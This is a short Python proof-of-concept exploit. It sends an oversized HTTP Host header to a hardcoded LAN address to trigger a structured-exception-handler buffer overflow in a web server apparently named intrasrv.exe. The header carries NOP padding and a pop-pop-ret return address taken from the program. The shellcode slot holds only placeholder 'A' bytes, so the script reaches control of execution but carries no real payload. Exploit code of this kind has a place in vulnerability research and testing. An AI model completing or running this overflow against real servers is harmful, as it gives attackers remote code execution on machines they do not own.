#!/usr/bin/python

import socket
import os
import sys

target="192.168.1.169"

seh="\xdd\x97\x40\x00"  #0x004097dd, # pop eax # pop ebp # ret  - intrasrv.exe
crash = "\x90"*1553 + seh + "B" * 1500
shellcode = "A"*2500

buffer="GET / HTTP/1.1\r\n"
buffer+="Host: " + crash + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1)\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+= shellcode

one = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
one.connect((target, 80))
one.send(buffer)
one.close()